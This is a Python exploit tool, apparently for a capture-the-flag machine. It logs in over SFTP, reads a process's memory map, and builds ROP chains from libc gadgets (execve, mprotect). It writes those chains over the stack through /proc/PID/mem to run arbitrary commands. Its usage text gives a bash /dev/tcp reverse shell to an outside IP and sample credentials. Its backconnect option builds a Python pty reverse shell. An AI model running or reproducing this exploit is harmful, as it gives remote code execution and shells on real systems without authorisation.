#!/usr/bin/env python3
import paramiko
import sys
from argparse import ArgumentParser, RawTextHelpFormatter
from binascii import unhexlify
from shlex import split
from os.path import join, exists
from sys import argv, platform, stdin
from pwn import ELF, p32, p64, log, sleep



def anyhex_to_bytes(fhex):
    bytes = b''
    pieces = fhex.replace(',', ' ').replace('\n', ' ').split()
    for piece in pieces:
        if   len(piece) == 1:
            piece = '0' + piece
        elif len(piece) >= 2:
            if piece[:2] == '0x': piece = piece[2:]
        bytes += unhexlify(piece.encode())
    return bytes

def shellcode_convert(shellcode):
    if not shellcode:
        return
    s = shellcode.lower()
    hex_chars = '0123456789abcdef '
    if '\\x' in s:
        hexstring = s.replace('\\x','')
    elif not list(set(list(s)) - set(list(hex_chars))):
        hexstring = s
    else:
        args = []
        for arg in split(shellcode):
            args.append(arg.encode() + b'\x00')
        return args
    return anyhex_to_bytes(hexstring)



class Maps():
    def __init__(self):
        self.dct = {}

    def prepare(self, line):
        self.line = line
        self.words = self.line.split()
        self.addr_double, self.permissions, self.offset, self.dev, self.inode = self.words[0:5]
        if len(self.words) == 6:
            self.pathname = self.words[5]
        else:
            self.pathname = ''
        self.addr_start, self.addr_end = self.addr_double.split('-')

    def check_arch(self, line):
        addr_start = line.split()[0].split('-')[0]
        if len(addr_start) <= 8:
            self.arch = 32
        else:
            self.arch = 64
        self.dct['arch'] = self.arch

    def print_by_line(self):
        self.prepare(self, line)
        print('addr: {}\nperm: {}\noffset: {}\ndev: {}\ninode: {}\npathname: {}\n'.format(self.addr_double, self.permissions, self.offset, self.dev, self.inode, self.pathname))

    def search_pathname(self, line, lst):
        values = {}
        name, perm_chars = lst
        self.prepare(line)
        if name in self.pathname.lower() and (not perm_chars or perm_chars == self.permissions):
                s  = '[+] mapped from {} to {} '.format('0x'+self.addr_start, '0x'+self.addr_end)
                s += 'with permissions \'{}\' {}'.format(self.permissions, self.pathname)
                print(s)
                values['addr_start'] =  self.addr_start
                values['addr_end'] =  self.addr_end
                values['permissions'] =  self.permissions
                values['offset'] =  self.offset
                values['dev'] =  self.dev
                values['inode'] =  self.inode
                values['pathname'] =  self.pathname
                return values

    def gen_dct(self, lines, lsts):
        self.check_arch(lines[0])
        log.info('Arch is {}'.format(self.dct['arch']))
        for line in lines:
            for lst in lsts:
                if len(lst) == 1:
                    lst += ['']
                values = Maps().search_pathname(line, lst)
                if values:
                    self.dct[lst[0]] = values
        return self.dct



def stack(shellcode, stack_size, dct_addrs, arch, mode):

    def check_addrs(required_addrs, existing_addrs):
        missing_addrs = set(required_addrs) - set(existing_addrs)
        if missing_addrs:
            log.warning('Missing addresses: {}'.format(list(missing_addrs)))
            sys.exit(0)
    
    new_stack = b''

    if   mode == 'execve':
        if arch == 32:
            dct_addrs['code_addr'] = dct_addrs['stack_top_addr']

            required_addrs = ['code_addr', 'popa_ret_addr', 'ret_addr', 'int80h_addr']
            check_addrs(required_addrs, dct_addrs.keys())

            #shellcode = [b'/bin/mkdir\x00', b'-p\x00', b'/tmp/elite\x00']
            ptrs = []
            ptrs_addr = dct_addrs['code_addr']
            for arg in shellcode:
                ptrs.append(p32(ptrs_addr))
                ptrs_addr += len(arg)
            ptrs.append(p32(0))

            code  = b''.join(shellcode) + b''.join(ptrs)

            eax  = p32(11)
            ebx  = p32(dct_addrs['code_addr'])
            ecx  = p32(ptrs_addr)
            edx  = p32(0)
            miss = p32(0)
            ebp  = p32(0)
            esi  = p32(0)             
            edi  = p32(0)
            registers = edi + esi + ebp + miss + ebx + edx + ecx + eax

            code = code + (4 - (len(code) % 4)) * b'\x00'

            chain  = p32(dct_addrs['popa_ret_addr']) + registers + 2*p32(dct_addrs['ret_addr'])
            chain += p32(dct_addrs['int80h_addr'])

            block_length = (len(code) // 4) + len(chain) // 4

            new_stack += code + ( (stack_size // 4) - block_length) * p32(dct_addrs['ret_addr']) + chain
        else:
            dct_addrs['code_addr'] = dct_addrs['stack_top_addr']

            required_addrs  = ['code_addr', 'ret_addr', 'execve_addr']
            required_addrs += ['pop_rdi', 'pop_rsi', 'pop_rdx']
            check_addrs(required_addrs, dct_addrs.keys())

            #shellcode = [b'/bin/mkdir\x00', b'-p\x00', b'/tmp/elite\x00']
            ptrs = []
            ptrs_addr = dct_addrs['code_addr']
            for arg in shellcode:
                ptrs.append(p64(ptrs_addr))
                ptrs_addr += len(arg)
            ptrs.append(p64(0))

            code  = b''.join(shellcode) + b''.join(ptrs)

            argv1 = p64(dct_addrs['code_addr']) # rdi
            argv2 = p64(ptrs_addr)              # rsi
            argv3 = p64(0)                      # rdx

            code = code + (8 - (len(code) % 8)) * b'\x00'

            chain  = p64(dct_addrs['pop_rdi']) + argv1 + p64(dct_addrs['pop_rsi']) + argv2
            chain += p64(dct_addrs['pop_rdx']) + argv3
            chain += p64(dct_addrs['execve_addr'])

            block_length = (len(code) // 8) + len(chain) // 8

            new_stack += code + ( (stack_size // 8) - block_length) * p64(dct_addrs['ret_addr']) + chain
    else:
        if arch == 32:
            dct_addrs['code_addr'] = dct_addrs['stack_top_addr']

            required_addrs  = ['code_addr', 'popa_ret_addr', 'ret_addr', 'call_esi_addr', 'mprotect_addr']
            check_addrs(required_addrs, dct_addrs.keys())

            code  = shellcode

            argv1 = p32(dct_addrs['code_addr'])
            argv2 = p32(stack_size)
            argv3 = p32(7) # rwx [1+2+4]
            argv4 = p32(0)
            ret   = p32(dct_addrs['code_addr'])

            code = code + (4 - (len(code) % 4)) * b'\x00'

            chain  = p32(dct_addrs['mprotect_addr']) + ret + argv1 + argv2 + argv3 + argv4

            block_length = (len(code) // 4) + len(chain) // 4

            new_stack += code + ( (stack_size // 4) - block_length) * p32(dct_addrs['ret_addr']) + chain
        else:
            dct_addrs['code_addr'] = dct_addrs['stack_top_addr']

            required_addrs  = ['code_addr', 'ret_addr', 'mprotect_addr']
            required_addrs += ['pop_rdi', 'pop_rsi', 'pop_rdx']
            check_addrs(required_addrs, dct_addrs.keys())

            code  = shellcode

            argv1 = p64(dct_addrs['code_addr']) # rdi
            argv2 = p64(stack_size)             # rsi
            argv3 = p64(7)  # rwx [1+2+4]       # rdx
            ret   = p64(dct_addrs['code_addr'])

            code = code + (8 - (len(code) % 8)) * b'\x00'

            chain  = p64(dct_addrs['pop_rdi']) + argv1 + p64(dct_addrs['pop_rsi']) + argv2
            chain += p64(dct_addrs['pop_rdx']) + argv3
            chain += p64(dct_addrs['mprotect_addr']) + ret

            block_length = (len(code) // 8) + len(chain) // 8

            new_stack += code + ( (stack_size // 8) - block_length) * p64(dct_addrs['ret_addr']) + chain
    return new_stack



def main(shellcode, delta_stack, dct_args, libs_args, mode):
    pid = dct_args['pid'] 
    log.info('Analysing /proc/{}/maps on remote/local system'.format(pid))
    path_to_maps = '/proc/{}/maps'.format(pid)
    path_to_mem = '/proc/{}/mem'.format(pid)

    if   'sftp' in dct_args:
        sftp = dct_args['sftp']
        sftp.get(path_to_maps, '/tmp/maps')
        path_to_maps = '/tmp/maps'

    f = open(path_to_maps, 'r')
    lines = f.readlines()
    f.close()
    dct = Maps().gen_dct(lines, libs_args)
    arch = dct['arch']

    for lst in libs_args:
        if lst[0] not in dct.keys():
            log.warning('{} not found'.format(lst[0]))
            sys.exit(0)

        pathname = dct[lst[0]]['pathname']
        if '[' not in pathname:
            if   'sftp' in dct_args:
                sftp.get(pathname, '/tmp/{}'.format(lst[0]))
                dct[lst[0]]['filepath'] = '/tmp/{}'.format(lst[0])
            else:
                dct[lst[0]]['filepath'] = dct[lst[0]]['pathname']

    e = ELF(dct['libc']['filepath'])

    dct_addrs = {}
    def add_addr(shift, bytes, name, comment='', shape=''):
        try:
            if   shape == 'symbol':
                addr = shift + e.symbols[bytes]
            else:
                addr = shift + next(e.search(bytes))
            dct_addrs[name] = addr
            print('[+] {}   ; {}'.format(hex(addr), comment))
        except:
            print('[-] {} not found'.format(name))

    shift_to_libc = int(dct['libc']['addr_start'], 16)

    dct_addrs['stack_top_addr']  = int(dct['[stack]']['addr_start'], 16)
    dct_addrs['stack_both_addr'] = int(dct['[stack]']['addr_end'], 16)

    add_addr(shift_to_libc, b'mprotect', 'mprotect_addr', 'mprotect', 'symbol')
    add_addr(shift_to_libc, b'execve',   'execve_addr',   'execve',   'symbol')

    add_addr(shift_to_libc,     b'\xc3',         'ret_addr',          'ret')

    if arch == 32:
        add_addr(shift_to_libc, b'\xcd\x80',     'int80h_addr',       'int 0x80')
        add_addr(shift_to_libc, b'\x61\xc3',     'popa_ret_addr',     'popa; ret')
        add_addr(shift_to_libc, b'\xff\xd6',     'call_esi_addr',     'call esi')
    else:
        add_addr(shift_to_libc, b'\x5f\xc3',     'pop_rdi',           'pop rdi; ret')
        add_addr(shift_to_libc, b'\x5e\xc3',     'pop_rsi',           'pop rsi; ret')
        add_addr(shift_to_libc, b'\x5a\xc3',     'pop_rdx',           'pop rdx; ret')

    if 'sftp' in dct_args:
        m = sftp.open(path_to_mem, 'w+b')
    else:
        m = open(path_to_mem, 'w+b')
    if m.writable():
        log.info('Good, \'r/w\' permissions for /proc/{}/mem'.format(pid))
    else:
        log.warning('Fatal error. No \'r/w\' permissions')
        m.close()
        sys.exit(0)

    real_stack_size = dct_addrs['stack_both_addr'] - dct_addrs['stack_top_addr']
    print('[+] real stack size: {}'.format(str(real_stack_size)))
    stack_size = real_stack_size - delta_stack   # new stack
    print('[+] current stack size: {}'.format(str(stack_size)))

    new_stack = stack(shellcode, stack_size, dct_addrs, arch, mode)

    # write stack from start
    m.seek(dct_addrs['stack_top_addr'])
    log.info('Pushing new stack to {}'.format(hex(dct_addrs['stack_top_addr'])))
    sleep(dct_args['sleep'])
    try:
        m.write(new_stack)
    except paramiko.SSHException:
        log.success('Excellent, the program dropped the connection')
        sys.exit(0)
    except paramiko.sftp.SFTPError:
        log.success('Excellent, the program sent the garbage packet')
        sys.exit(0)
    log.info('Not bad, the program is working fine')
    m.close()
    sftp.close()



if __name__ == '__main__':
    version = '2.2'

    colors = ['','']
    if platform[0:3] == 'lin':
        colors = ['\033[1;m\033[10;31m', '\033[1;m']

    banner = '''{}
    __                              __
   / /   ___  ____ ____  ____  ____/ /
  / /   / _ \/ __ `/ _ \/ __ \/ __  / 
 / /___/  __/ /_/ /  __/ / / / /_/ /  
/_____/\___/\__, /\___/_/ /_/\__,_/   
           /____/                     


           Author: m0rph0

             version {}
{}'''.format(colors[0], version, colors[1])
    usage  = '''
./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -c "/bin/bash -pi >& /dev/tcp/10.10.15.59/443 0>&1"

./legend.py -r 10.10.10.66 -p 2222 -u ftpuser -P "@whereyougo?" -b "10.10.14.197 443"
'''

    parser = ArgumentParser(description=banner,
                            formatter_class=RawTextHelpFormatter,
                            epilog=usage)

    parser.add_argument("-m",'--mode', dest='mode', type=str, default='sftp', help="mode [sftp, none]")
    parser.add_argument("-l","-r",'--host', dest='host', type=str, default=None, help="host [127.0.0.1]")
    parser.add_argument("-p",'--port', dest='port', type=int, default=None, help="port [22]")
    parser.add_argument("--pid", dest='pid', type=str, default='self', help="pid")
    parser.add_argument("-u",'--username', dest='username', type=str, default=None, help="username")
    parser.add_argument("-P",'--password', dest='password', type=str, default=None, help="password")
    parser.add_argument("-s",'--shellcode', dest='shellcode', type=str, default=None, help="shellcode")
    parser.add_argument("-f",'--file_payload', dest='fpayload', type=str, default=None, help="file to payload")
    parser.add_argument("-c",'--cmd', dest='cmd', type=str, default=None, help="cmd")
    parser.add_argument("-b",'--backconnect', dest='backconnect', type=str, default=None, help="backconnect")
    parser.add_argument("-x",'--func', dest='func', type=str, default=None, help="func [execve]")
    parser.add_argument("-d",'--delta', dest='delta_stack', type=int, default=4096, help="stack-delta")
    parser.add_argument("-t",'--sleep', dest='sleep', type=int, default=7, help="sleep before pushing")
    parser.add_argument("-",'--stdin', dest='stdin', action='store_true', help="stdin flag")

    args = parser.parse_args()

    if   args.cmd:
        args.func = 'execve'
        args.shellcode = '/bin/bash -c "{}"'.format(args.cmd)
    elif args.backconnect:
        args.func = 'execve'
        back_host, back_port = args.backconnect.split()
        args.shellcode  = "import pty,socket,subprocess,os;"
        args.shellcode += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        args.shellcode += "s.connect(('{}',{}));".format(back_host, back_port)
        args.shellcode += "os.dup2(s.fileno(),0);"
        args.shellcode += "os.dup2(s.fileno(),1);"
        args.shellcode += "os.dup2(s.fileno(),2);"
        args.shellcode += "pty.spawn(['/bin/bash','-pi']);"
        args.shellcode  = '/usr/bin/python -c "{}"'.format(args.shellcode)

    if not (args.shellcode or args.fpayload or args.stdin):
        print(usage)
        sys.exit(0)
    elif args.shellcode:
        args.shellcode = shellcode_convert(args.shellcode)
    elif args.fpayload:
        if exists(args.fpayload):
            with open(args.fpayload, 'rb') as f:
                args.shellcode = f.read()
    elif args.stdin:
        lines = ''
        while True:
            line = stdin.readline()
            if line == '':
                break
            lines += line
        args.shellcode = shellcode_convert(lines)
    else:
        parser.print_help()
        exit(1)

    libs_args = [ ['libc', 'r-xp'], ['[stack]'] ]
    dct_args = {}

    if args.mode == 'sftp' and args.host and args.username and args.password and args.shellcode:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if not args.port:
            args.port = 22

        t = paramiko.Transport((args.host, args.port))
        t.connect(username=args.username, password=args.password)
        sftp = paramiko.SFTPClient.from_transport(t)

        libs_args += [ ['sftp-server', 'r-xp'] ]
        dct_args['sftp'] = sftp
        dct_args['transport'] = t
        dct_args['pid'] = args.pid
        dct_args['sleep'] = args.sleep
        main(args.shellcode, args.delta_stack, dct_args, libs_args, args.func)
        sftp.close()
        ssh.close()
    elif args.shellcode:
        dct_args['pid'] = args.pid
        dct_args['sleep'] = args.sleep
        main(args.shellcode, args.delta_stack, dct_args, libs_args, args.func)
    else:
        print(usage)
        sys.exit(0)




